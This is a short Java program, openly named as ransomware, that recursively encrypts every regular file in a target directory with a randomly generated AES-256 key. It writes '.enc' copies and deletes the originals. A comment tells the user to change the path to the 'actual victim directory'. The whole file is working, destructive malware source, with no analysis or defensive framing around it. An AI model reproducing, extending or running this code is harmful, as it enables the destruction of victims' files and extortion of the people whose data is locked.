import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import java.io.*;
import java.nio.file.*;
import java.security.SecureRandom;
import java.util.Base64;

public class ransomewareencryption {

    private static final String ALGORITHM = "AES";
    private static final int KEY_SIZE = 256;
    private static SecretKey secretKey;

    public static void main(String[] args) throws Exception {
        String targetDir = "/home/ubuntu/Documents/critical"; // Change to actual victim directory

        // Generate encryption key
        secretKey = generateKey();
        System.out.println("Encryption Key (Save this!): " + Base64.getEncoder().encodeToString(secretKey.getEncoded()));

        // Recursively encrypt files
        Files.walk(Paths.get(targetDir))
                .filter(Files::isRegularFile)
                .forEach(file -> {
                    try {
                        encryptFile(file.toFile(), secretKey);
                        file.toFile().delete(); // delete original
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                });

        System.out.println("✅ All files encrypted.");
    }

    private static SecretKey generateKey() throws Exception {
        KeyGenerator keyGen = KeyGenerator.getInstance(ALGORITHM);
        keyGen.init(KEY_SIZE, new SecureRandom());
        return keyGen.generateKey();
    }

    private static void encryptFile(File file, SecretKey key) throws Exception {
        Cipher cipher = Cipher.getInstance(ALGORITHM);
        cipher.init(Cipher.ENCRYPT_MODE, key);

        byte[] fileData = Files.readAllBytes(file.toPath());
        byte[] encryptedData = cipher.doFinal(fileData);

        FileOutputStream fos = new FileOutputStream(file.getAbsolutePath() + ".enc");
        fos.write(encryptedData);
        fos.close();
    }
}
